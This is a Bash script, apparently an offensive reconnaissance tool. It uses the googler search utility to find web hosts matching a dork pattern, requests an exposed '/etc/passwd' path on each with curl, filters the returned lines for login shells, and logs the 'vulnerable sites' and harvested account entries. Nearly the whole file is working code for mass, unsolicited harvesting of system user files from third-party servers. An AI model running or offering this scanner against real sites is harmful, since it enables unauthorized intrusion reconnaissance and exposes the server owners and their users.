#!/bin/bash
#
#
#

VERBOSE=1
AGENT='User name scanner'

GOOGLE_SEARCH=googler
FINDS=10 # Maximum number of google finds
GOOGLER_CONFIG=(
    '--unfilter'        # Do not omit similar results.
    "--count=${FINDS}"  # Show N results (default 10).
    '--exact'           # Disable automatic spelling correction. Search exact keywords.
    #"--time=dN"        # Time limit search [h5 (5 hrs), d5 (5 days), w5 (5 weeks),  m5  (5  months),  y5  (5           years)].
    '--noprompt'        # Perform search and exit; do not prompt for further interactions.
)

CURL_TIMEOUT=1

TMP=$(mktemp tmp-scan.XXXXXXXXXX)

# List of possible login shells without path
LOGIN_SHELLS=(
    bash
    dash
    es
    esh
    git-shell
    ksh
    ksh93
    mksh
    mksh-static
    rbash
    rksh93
    sh
    tcsh
    zsh
)

SHELL_REGEX=$(sed -r 's/[a-z]+/\/&$/g' <<< ${LOGIN_SHELLS[*]} | tr ' ' '|')

RESULT=() # RESULT

declare -A SCAN_DONE # Contains list of already explored hostnames

declare -A PATTERN
#### PATTERN[Search pattern]='custom;function;interesting paths;...'
# PATTERN[Search pattern]='interesting paths;...'

# Pattern: 000~ROOT~000
# Info:

PATTERN['000~ROOT~000']='/home/000~ROOT~000/etc/passwd'

function search_engine() {
    cmd="$GOOGLE_SEARCH ${GOOGLER_CONFIG[*]}"
    [ $VERBOSE -eq 1 ] && printf "$0: Info -- Using '%s'\n" $cmd
    eval $cmd '$*'
}

function check_deps() {
    check="$(whereis $GOOGLE_SEARCH | cut -d: -f2)"

    [ -z "$check" ] && {
        printf "Missing utility '%s'!\n" $GOOGLE_SEARCH 1>&2 ; exit 1;
    }
}

function get_url_host() {
    sed -rne '/http[s]?/{s,(http[s]?)://([^/]*)/.*,\1://\2,g;p}'
}


function process_output() {
    local hostname=$1
    IFS=$'\n'
    for line in $(grep -E "$SHELL_REGEX" $TMP)
    do
        echo $hostname:$line
        RESULT+=($hostname:$line)
    done
}

function at_exit() {
    rm -f "$TMP"
    time_stamp=$(date +"%Y%m%d%H:%M:%S")
    vuln_list=scan-${time_stamp}.log

    echo "List of vulnerable sites stored in: $vuln_list"
    for host in ${!SCAN_DONE[*]}
    do
        [ ${SCAN_DONE[$host]} -eq 200 ] && echo $host
    done > "$vuln_list"

    result_list=scan-finds-${time_stamp}.log
    echo "List of /etc/passwd storen in: $result_list"
    printf "%s\n" ${RESULT[*]} > "$result_list"
}

########
# Main #
########

check_deps

for pattern in ${!PATTERN[*]}
do
    path=${PATTERN[$pattern]}
    for host in $(search_engine "$pattern" | get_url_host)
    do
        hostname=$(sed -r 's,http[s]?://,,g' <<< "$host")
        url="$host/$path"
        if [[ " ${SCAN_DONE[@]} " =~ " ${hostname} " ]]; then
            echo "$0: Skipping $hostname"
            continue
        fi

        ret_code=$(curl --user-agent "$AGENT" --silent \
            --connect-timeout $CURL_TIMEOUT \
            --write-out "%{http_code}" "$url" --output $TMP)

        echo "$0: Accessing $url, HTTP code: $ret_code"
        if [ $ret_code -eq 200 ] ; then
            process_output $hostname
        fi
        SCAN_DONE[$hostname]=$ret_code
    done
done

at_exit
